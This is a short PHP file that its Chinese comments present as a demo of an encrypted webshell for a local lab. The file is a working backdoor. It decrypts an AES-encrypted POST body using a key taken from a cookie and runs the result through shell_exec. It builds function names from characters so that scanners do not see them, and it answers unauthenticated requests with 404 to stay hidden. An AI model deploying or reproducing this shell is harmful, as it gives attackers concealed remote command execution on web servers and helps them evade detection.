<?php
// PHP 加密通讯马 demo（本地实验环境）：请求体 AES 解密后执行——流量侧零特征关键词
// 客户端：POST body = openssl_encrypt(载荷, 'AES-128-CBC', KEY, OPENSSL_RAW_DATA, IV)
// key/iv 走 Cookie（t=iv+key 拼装）；免杀面：无 eval/assert/system 明文（动态函数+解密）
$k = $_COOKIE['t'] ?? '';
if ($k === '' || strlen($k) < 32) { http_response_code(404); exit; }
$fn = chr(111).'penssl_'.'decrypt';
$in = file_get_contents('php://input');
$iv = substr($k, 0, 16);
$pt = $fn($in, 'AES-128-CBC', substr($k, 16, 16), OPENSSL_RAW_DATA, $iv);
if ($pt === false) { http_response_code(500); exit; }
$dispatch = ['c' => function($x){ return shell_exec($x); }];
$op = $pt[0]; $arg = substr($pt, 1);
echo $dispatch[$op]($arg);
